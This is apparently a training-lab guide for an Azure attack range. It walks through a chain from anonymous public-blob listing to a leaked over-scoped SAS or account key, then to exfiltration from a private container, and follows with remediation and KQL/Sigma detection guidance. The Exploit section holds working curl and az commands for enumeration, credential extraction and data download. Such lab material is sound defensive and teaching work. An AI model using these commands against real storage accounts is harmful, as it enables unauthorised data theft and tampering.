# AP07 — Anonymous public storage -> over-scoped SAS leak -> private-container exfiltration

- **Layer:** Azure (Storage — blob data plane)
- **Cost:** **~0 — one of the cheapest Azure infrastructure (ARM) paths in the range (tied with AP08).** Storage account **with no compute / NO VM** + a few KB of blobs (cents) + `StorageBlobLogs` ingestion well below 0.1 GB/day (cents/month, 31-day retention included). `./azrange.ps1 destroy` or `reset` -> 0. It is the **first path that deploys Azure (ARM) resources without billing compute**: the *identity-only* AP01/AP03/AP04 are pure Entra (free, no ARM), and AP02/AP05 do deploy ARM, but **with a VM**.
- **MITRE ATT&CK:** [T1530](https://attack.mitre.org/techniques/T1530/) (Data from Cloud Storage — *primary*) · [T1619](https://attack.mitre.org/techniques/T1619/) (Cloud Storage Object Discovery) · [T1552.001](https://attack.mitre.org/techniques/T1552/001/) (Unsecured Credentials: Credentials In Files)
- **Maps to cert:** CARTP (Azure storage plane; data exfiltration)
- **Precondition seeded by the range** (100% Terraform, `enable_ap07 = true`):
  - Storage account `azrangeap07<rand>` (output `ap07_storage_account`) with a **deliberately opened double anonymous-access gate**:
    1. **at the account level** — `allow_nested_items_to_be_public = true`. It is the **exact inverse** of the secure `azurerm_storage_account.dsc` block in the `hybrid-ad` module (which pins it to `false`) -> same `account_tier`/`replication`/`min_tls_version = "TLS1_2"`, with only the public-access property inverted.
    2. **at the container level** — the `public` container with `container_access_type = "container"` (allows anonymously **LISTING** blobs, not just reading them).
  - Public container `public` holding the leaked artifact `backup-config.json`, which embeds an **over-privileged credential** to the private container of the **same account**. By default (`leak_mode = "sas"`) it is an **over-scoped, long-lived account SAS** (up to `sas_expiry_years`, default **10 years**); switchable to `leak_mode = "account_key"`, where what leaks is the raw `primary_access_key` (full control of the account).
  - Private container `sensitive-data` (`container_access_type = "private"`) with the **crown jewel**: `customers.csv`, **100% synthetic** PII plus the flag `AZRANGE{ap07_public_blob_to_sas_to_private_exfil}`.
  - **Data-plane** telemetry: an `azurerm_monitor_diagnostic_setting` (`azrange-ap07-blob-diag`) over `.../blobServices/default` -> `StorageBlobLogs` table in `azrange-ap07-law` (output `ap07_law_name`) or in an external Sentinel (`existing_log_analytics_workspace_id`); gated by `collect_storage_logs` (default `true`).
  - **100% declarative: no `seed-ap07.ps1`, no `az vm run-command`, no post-apply hook** — entirely wired by Terraform, **leaked credential included** (embedded via `source_content`): it shares this property with AP02/AP03/AP04 and differs from AP01/AP05, which seed their *payload* with imperative scripts (`seed-ap01.ps1` / `seed-ap05.ps1`). **What is NOT seeded:** any attacker action outside the state (unlike AP02).

> **Warning — the credential lands in the `tfstate`.** The `source_content` of the leaked blob, and —in SAS mode— `data.azurerm_storage_account_sas` + `primary_connection_string` (or, in account_key mode, `primary_access_key` **+** `primary_connection_string`, both embedded in the blob), live in the Terraform state **in cleartext and marked as sensitive**. Treat the `tfstate` as **toxic**, just like the SP *client secret* in AP02 or `dc_admin_password` in AP05. The repo's `.gitignore` already blocks `*.tfstate*`.

---

## 🎯 Learning objective

For the student to internalize that **anonymous blob access is not a binary flaw but a double gate**, and that **a secret at rest inside a public artifact turns a read leak into a full data-plane takeover**. The scenario demonstrates the canonical CARTP chain in the *storage plane*: `anonymous enumeration -> download of a leaked config -> over-scoped credential -> authenticated pivot to the private container -> exfiltration (and, if the credential carries write, tampering)`.

The conceptual core is **two simultaneous, independent conditions**, neither sufficient on its own:

- **`allow_nested_items_to_be_public = true` (account)** — the *master switch*. Since ~November 2023 its default value for new accounts is `false`, so **the range must set it explicitly to `true`** or the account would not be vulnerable even if the container were `container`.
- **`container_access_type = "container"` (container)** — enables anonymous **LISTING** (`?restype=container&comp=list`), not just reading. It is what makes *discovery* (T1619) possible without guessing the blob name.

**Break either one and the chain dies** — which is why 🟢 offers independent cuts (defense in depth, mirroring the five ESC1 conditions in AP05).

The second lesson is about **least-privilege**: what leaks in the real world inside config files, JS bundles, or GitHub repos **is usually not the raw account key, but over-privileged, long-lived SAS tokens and connection strings**. A **badly-scoped account SAS** is the real #1 cause of storage breaches. The correct antidote is not "remove the SAS" but an **Entra-backed user-delegation SAS** (minimal, revocable without rotating the key) — see 🟢.

> **`leak_mode` fork (switchable by design).** The range keeps `leak_mode` as a variable (`"sas"` by default, `"account_key"` as a validated *fallback*). **SAS** teaches the least-privilege angle and the fidelity caveat "the SAS signature does not travel in the log". **Account key** is more severe (key = full control: all containers, write, delete, regenerate) and its antidote is `shared_access_key_enabled = false`. In **both** modes the credential lands in the `tfstate`.

**Contrast with AP02/AP05 — three design traits:** (1) **100% declarative**, leaked credential included (embedded via `source_content`), without the post-deployment imperative action of AP01/AP05 (`seed-ap01.ps1` / `seed-ap05.ps1`) — a property it shares with AP02/AP03/AP04; (2) **first `azurerm_monitor_diagnostic_setting` in the repo** over the *data plane* (AP05's `monitoring.tf` uses AMA/DCR, which is for the event channel of a Windows VM, **not** for blobs); (3) **reset residue as clean as AP05's** — the entire vulnerable surface, leaked credential included, lives in destroyable `azurerm` resources, with no *out-of-state* residue.

---

## 🔴 Exploit (how it is exploited)

> Authorized training lab, in your own test tenant/subscription. The account name **is not a secret** ("security through obscurity"): the `<rand>` suffix only avoids collisions and trivial guessing. Public reference tooling: **curl** (the canonical anonymous enumerator), **az cli** / **azcopy**, **MicroBurst** (`Invoke-EnumerateAzureBlobs`), **Azure Storage Explorer**, public-blob search engines like *Grayhat Warfare*.

The chain is `anonymous LIST (public) -> anonymous GET (backup-config.json) -> credential -> authenticated GET (sensitive-data/customers.csv)`. The range provides **two tracks** corresponding to the two trust jumps.

### Track A — **anonymous** enumeration and download (no credential at all)

Anonymous access is exercised with **plain HTTP** (curl / REST), not with `az` (which requires an authentication mode). That is exactly the point: *no identity is needed*.

```bash
ACCT=azrangeap07<rand>        # = terraform output -raw ap07_storage_account

# 1. T1619 — LIST the public container anonymously.
#    Works only if  allow_nested_items_to_be_public=true  AND  container_access_type=container.
curl -s "https://${ACCT}.blob.core.windows.net/public?restype=container&comp=list"
#   -> <EnumerationResults ...><Blobs><Blob><Name>backup-config.json</Name>...
#   (the ap07_attacker_hint Terraform output renders exactly this one-liner, with no secrets)

# 2. T1530 + T1552.001 — DOWNLOAD the leaked config (credential at rest in a file).
curl -s "$(terraform output -raw ap07_leaked_config_url)"      # = https://${ACCT}.blob.core.windows.net/public/backup-config.json
```

The body of `backup-config.json` depends on `leak_mode`:

```jsonc
// leak_mode = "sas"  (default)
{
  "storageAccount": "azrangeap07<rand>",
  "container":      "sensitive-data",
  "sasUrl":         "https://azrangeap07<rand>.blob.core.windows.net/sensitive-data?sv=2023-11-03&ss=b&srt=sco&sp=rwdlacuptf&se=2035-11-15T00:00:00Z&spr=https&sig=<base64...>",
  "note":           "nightly backup job connection - rotate before prod"
}
// leak_mode = "account_key"  (the blob embeds key + connection string)
{ "storageAccount": "azrangeap07<rand>", "accountKey": "<primary key base64>", "connectionString": "DefaultEndpointsProtocol=https;AccountName=azrangeap07<rand>;AccountKey=<primary key base64>;EndpointSuffix=core.windows.net", "note": "nightly backup job connection - rotate before prod" }
```

> **Caveat — `blob` vs `container` is *load-bearing*.** With `container_access_type = "blob"` an anonymous caller can **read** a blob *if they guess its name*, but **cannot list**. The lab uses `"container"` on purpose so that discovery (T1619) does **not** depend on guessing `backup-config.json`: the `?comp=list` reveals it.

> **Caveat — the `.sas` has no leading `?`.** The `sas` property of `azurerm_storage_account_sas` starts at `sv=...`, not at `?sv=...`. That is why the leaked blob's `sasUrl` is built as `https://<host>/sensitive-data?${sas}` (the template adds the `?`). The attacker uses it as-is.

### Track B — **authenticated** pivot to the private container (the crown jewel)

The credential extracted from `backup-config.json` opens `sensitive-data`, which is **not** anonymously listable.

```bash
# leak_mode = "sas" : the over-scoped SAS (sp=rwdlacuptf -> r/w/d/l/a/c/u/p +t/f across the WHOLE
#   account; tag(t)/filter(f) are required by the azurerm_storage_account_sas data source schema)
SAS='sv=2023-11-03&ss=b&srt=sco&sp=rwdlacuptf&se=2035-11-15T00:00:00Z&spr=https&sig=<base64...>'

# List the private container (now signed) and pull the crown jewel:
curl -s "https://${ACCT}.blob.core.windows.net/sensitive-data?restype=container&comp=list&${SAS}"
curl -s "https://${ACCT}.blob.core.windows.net/sensitive-data/customers.csv?${SAS}"
#   -> ...,AZRANGE{ap07_public_blob_to_sas_to_private_exfil}

# Equivalent with az using the SAS token:
az storage blob download --account-name "$ACCT" --container-name sensitive-data \
  --name customers.csv --sas-token "$SAS" -o tsv
```

```bash
# leak_mode = "account_key" : the key gives FULL control of the account.
KEY='<primary key base64>'
az storage blob download --account-name "$ACCT" --container-name sensitive-data \
  --name customers.csv --account-key "$KEY" -o tsv
```

> **Escalation / tampering branch.** The over-scoped account SAS includes `w`/`d`/`c` (and the key, everything): the attacker not only **reads** `customers.csv` but can **overwrite or delete** any blob in any container of the account (poisoning of backup artifacts / *supply-chain*). Exfiltration is the primary objective (T1530); writing is the *bonus* that justifies treating the leak as full control, not as "read-only".

---

## 🟢 Remediate (remediation)

The first two cut the chain **each independently** (defense in depth: closing **one** of the two gates is enough). Apply them in depth.

1. **Close the ACCOUNT gate (direct antidote + reset default).** `allow_nested_items_to_be_public = false` — exactly the value of the secure `azurerm_storage_account.dsc` block and the platform default since ~Nov-2023. With the account closed, the container's access level is **ignored**.
   ```bash
   az storage account update -g azrange-ap07-rg -n azrangeap07<rand> --allow-blob-public-access false
   ```

2. **Close the CONTAINER gate.** `container_access_type = "private"` on `public` -> the anonymous `?restype=container&comp=list` turns into `PublicAccessNotPermitted`.
   ```bash
   az storage container set-permission --account-name azrangeap07<rand> --name public --public-access off
   ```

3. **Get the secrets out of the blobs (root of T1552.001).** **Never** credentials in config files. Key Vault + **managed identity** / **workload identity federation** so the backup *job* obtains the credential at *runtime*, not from an artifact at rest.

4. **If a SAS is genuinely needed: a minimal, Entra-backed *user-delegation* SAS.** `az storage blob generate-sas --auth-mode login --as-user` scoped to **read-only, one container/object, minutes and IP** + an account-level **SAS expiration policy**. Key difference versus the account SAS: a user-delegation SAS **is revoked** with `az storage account revoke-delegation-keys` **without rotating the account key**; the over-scoped account SAS is only killed by **rotating the entire key** or waiting for it to expire (and here it expires in 10 years). Direct antidote to `leak_mode = "sas"`.

5. **`shared_access_key_enabled = false` -> data plane ONLY via Entra RBAC** (scoped `Storage Blob Data Reader/Contributor`). Kills at the root **both** the account key **and** the account SAS (both are signed with the *shared key*). Direct antidote to `leak_mode = "account_key"`.
   > **Caveat `[leak_mode=sas]` — incompatibility by design, not a bug.** `data.azurerm_storage_account_sas` **reads the key**, so it requires `shared_access_key_enabled = true`. Applying this remediation #5 with `enable_ap07 = true` makes the *data source* **fail** — correct: the safe state is the default and the vulnerable one is explicit.

6. **Harden transport and network.** `min_tls_version = "TLS1_2"` (already in the lab), *https-only*, `public_network_access_enabled = false` + *private endpoints* to take the data plane off the Internet.
   > **Caveat — secure transport does NOT mitigate the leak.** The blob endpoint is `https` anyway: `min_tls_version`/https-only do **not** close *public* access. They are kept at their secure value on purpose so the lesson **isolates the cause** (the vuln is public access, not transport).

7. **Platform / subscription.** Azure Policy **"Storage account public access should be disallowed"** / `denyPublicBlobAccess` (prevents *drift* to vulnerable across the whole sub) + **Microsoft Defender for Storage** (native detection of unusual anonymous access and exfiltration).

### In-place remediation in the range (the "Remediate" exercise)

Unlike AP05, **there is no `seed-ap07.ps1 -Remediate`**: the path is 100% declarative, so "fixing in-place" means **editing the attribute** (`allow_nested_items_to_be_public = false`, or `container_access_type = "private"`, or `shared_access_key_enabled = false`) and re-applying with `enable_ap07 = true`. The student re-runs Track A and verifies that the anonymous `?comp=list` returns `PublicAccessNotPermitted`.

> **Two reset levels — do not confuse them.** (1) **In-place / pedagogical:** flip one of the vulnerable attributes + `terraform apply` (above) -> leaves the account/telemetry standing to re-test attack and detection against the corrected state. (2) **Hard / cost->0:** `./azrange.ps1 reset` re-applies with `enable_ap07 = false` (`count = 0`) -> Terraform **atomically destroys** RG + account + both containers + **the leaked blob with the credential** + the SAS + the LAW. It is a reset **as clean as AP05's**, and cleaner than AP02/AP03/AP04's: unlike AP02 (where the attacker's *self-grant* is left **outside** the state and must be cleaned by hand), AP07 **has no attacker action outside the state** -> **zero *out-of-state* residue**, zero subsequent cost. (AP05 ties on reset cleanliness, but its ESC1 template is *seeded* with an imperative `run-command`; AP07 is declarative `azurerm` end-to-end, like AP02.)

---

## 🔵 Detect

Two planes, two sources, two natures of telemetry:

- **Data plane (the chain itself)** -> the **`StorageBlobLogs`** table, which **only exists if the range provisions the `diagnostic_setting`** over `blobServices/default` (`log_analytics_destination_type = "Dedicated"` -> *resource-specific* table, rich schema: `AuthenticationType`, `OperationName`, `Uri`, `CallerIpAddress`, `StatusCode`, `RequesterObjectId`). Gated by `collect_storage_logs`.
- **Management plane (the *misconfig*)** -> the **`AzureActivity`** table, which **flows to the SIEM by default without provisioning anything** (like AP02's management plane).

| Signal | Table | What to look for |
|---|---|---|
| Anonymous enumeration (T1619) | `StorageBlobLogs` | `AuthenticationType == "Anonymous"` + `OperationName == "ListBlobs"` over `public` = the `?restype=container&comp=list` of step 1 |
| Anonymous download of the credential (T1530/T1552.001) | `StorageBlobLogs` | `AuthenticationType == "Anonymous"` + `OperationName in ("GetBlob","GetBlobProperties")` + `Uri has "backup-config.json"` |
| **Authenticated pivot** to the private container (T1530) | `StorageBlobLogs` | `AuthenticationType in ("SAS","Account Key")` + `Uri has "sensitive-data/customers.csv"` from an unexpected `CallerIpAddress` |
| **Full chain (high fidelity)** | `StorageBlobLogs` | the **same `CallerIpAddress`**: `Anonymous`-ListBlobs(`public`) -> `Anonymous`-GetBlob(`backup-config.json`) -> `SAS/Key`-GetBlob(`sensitive-data`) in a short window (~30 min). Near-zero FP: it is exactly the *public->private* pivot that remediation makes impossible |
| Account *drift* to vulnerable | `AzureActivity` | `Microsoft.Storage/storageAccounts/write` with `allowBlobPublicAccess = true` |
| Key retrieval | `AzureActivity` | `Microsoft.Storage/storageAccounts/listKeys/action` |
| Container to public | `AzureActivity` | `Microsoft.Storage/storageAccounts/blobServices/containers/write` with `publicAccess in (blob, container)` |

- KQL (Sentinel / Defender XDR): [`detections/kql/AP07-public-storage-leak.kql`](../../detections/kql/AP07-public-storage-leak.kql) — `StorageBlobLogs` (anonymous list/get + SAS/Key pivot + chain correlation by `CallerIpAddress`) **and** `AzureActivity` (management plane).
- Sigma: [`detections/sigma/AP07-public-storage-leak.yml`](../../detections/sigma/AP07-public-storage-leak.yml) — `logsource product: azure, service: activitylogs`.

**Sigma vs KQL split (explicitly declared, as AP02 declared "the KV AuditEvent is not `activitylogs`" and AP05 "the SAN does not travel").** The **management plane** (misconfig + `listKeys` + `containers/write`, with a success filter by `status`/`properties.statusCode` just like AP02) **does** fit a standard Sigma *logsource* (`azure/activitylogs`). The **data plane** (`StorageBlobLogs` / anonymous-SAS blob access) **is not a standard Sigma *logsource* -> it is KQL-primary.** Do not force anonymous blob access into an `activitylogs` rule: it is not there.

> **Caveat — `StorageBlobLogs` is NOT active by default.** Without the `diagnostic_setting` over `blobServices/default`, anonymous access **does not exist in any SIEM** (exact analog of AP05's "on-prem events do not exist without AMA+DCR"). That is why 🔵 is only testable *end-to-end* if the range ingests them (`collect_storage_logs = true`). `AzureActivity` —the misconfig— **does** flow without provisioning.

> **Caveat — the SAS permissions and signature are NOT logged.** The log shows that **a** SAS was used (`AuthenticationType == "SAS"`) and **from which `CallerIpAddress` / toward which object**, but **not which SAS nor its scope** (that lives in the signature, not in the log). Correlation is by **IP / time / object**, never by the SAS content — the same "no global AND" lesson from AP04/AP05, mirroring "the SAN does not travel in 4886/4887". *(If the pipeline serializes `AuthenticationType` with a different string —e.g. `"Account Key"` vs `"AccountKey"`— adjust the predicate against a real `StorageBlobLogs` event; the KQL file is the authoritative source.)*

**Managed complement:** **Microsoft Defender for Storage** brings native detection of unusual anonymous access and of exfiltration — recommended alongside these rules.

> **Ingestion cost.** A few KB of blobs + the occasional operations of the exercise -> `StorageBlobLogs` well below 0.1 GB/day -> cents/month. It is turned off with `collect_storage_logs = false` (assumes an external SIEM). The diagnostic setting's `metric { category = "Transaction"; enabled = false }` avoids the known *perpetual-diff* when the API returns the `metric` block.

---

## ⚠️ Teachable caveat — `allowBlobPublicAccess` default = `false` (post-2023)

In the style of AP05's KB5014754 block: **for new accounts created since ~November 2023 the platform default of `allowBlobPublicAccess` is `false`.** That is, a freshly created account **is not vulnerable** even if the container is `"container"` — the container's access level is **ignored** while the account does not permit it. That is why the lab sets `allow_nested_items_to_be_public = true` **explicitly**: without that *opt-in* the path "would appear already patched". The repo's own secure `azurerm_storage_account.dsc` block uses `= false` -> **AP07 is its inverse**, which also confirms the attribute name for `azurerm ~3.116` (renamed from `allow_blob_public_access`).

> **Idempotency caveat (`[leak_mode=sas]`).** The SAS does **not** use `timestamp()`/`timeadd(timestamp(),…)` for `start`/`expiry`: that would recompute the HMAC signature on every `apply` and re-render `backup-config.json` (*perpetual-diff*, breaking "deploy twice = same state" from `CONTRIBUTING`). Instead, `time_static` (fixes the `start` once, persisted in state) + `time_offset` (`expiry = start + sas_expiry_years`) produce a **deterministic** token -> `terraform plan` after `apply` = *No changes*. It is the technical reason that justifies adding the `hashicorp/time ~> 0.12` provider, in the same pattern by which AP05 added `hashicorp/archive` to package the DSC.

---

## 📚 References

- Microsoft — [Prevent anonymous public read access to containers and blobs](https://learn.microsoft.com/en-us/azure/storage/blobs/anonymous-read-access-prevent) (`allowBlobPublicAccess`; default `false` for new accounts; account -> container precedence)
- Microsoft — [Configure anonymous read access for containers and blobs](https://learn.microsoft.com/en-us/azure/storage/blobs/anonymous-read-access-configure) (`blob` vs `container`: *read* vs *list*)
- Microsoft — [Grant limited access with shared access signatures (SAS)](https://learn.microsoft.com/en-us/azure/storage/common/storage-sas-overview) and [Create a user delegation SAS](https://learn.microsoft.com/en-us/azure/storage/blobs/storage-blob-user-delegation-sas-create-cli) (`--auth-mode login --as-user`; `revoke-delegation-keys`; SAS expiration policy)
- Microsoft — [Prevent Shared Key authorization](https://learn.microsoft.com/en-us/azure/storage/common/shared-key-authorization-prevent) (`shared_access_key_enabled = false` -> Entra RBAC)
- Microsoft — [Monitor Azure Blob Storage / `StorageBlobLogs`](https://learn.microsoft.com/en-us/azure/storage/blobs/monitor-blob-storage) and [resource log schema](https://learn.microsoft.com/en-us/azure/storage/blobs/monitor-blob-storage-reference) (`AuthenticationType`, `OperationName`, `Uri`, `CallerIpAddress`)
- Microsoft — [Overview of Microsoft Defender for Storage](https://learn.microsoft.com/en-us/azure/defender-for-cloud/defender-for-storage-introduction)
- NetSPI — **MicroBurst** (`Invoke-EnumerateAzureBlobs`): [github.com/NetSPI/MicroBurst](https://github.com/NetSPI/MicroBurst)
- MITRE ATT&CK — [T1530](https://attack.mitre.org/techniques/T1530/) (Data from Cloud Storage), [T1619](https://attack.mitre.org/techniques/T1619/) (Cloud Storage Object Discovery), [T1552.001](https://attack.mitre.org/techniques/T1552/001/) (Unsecured Credentials: Credentials In Files)
- Compare with [AP02](./AP02-managed-identity.md) (management plane via `AzureActivity`, `attacker_hint`, out-of-state *self-grant*) and [AP05](./AP05-adcs-esc1.md) (richness of caveats, two-level reset, precedent for the `hashicorp/time`/`archive` provider, "the signature does not travel in the log" lesson).
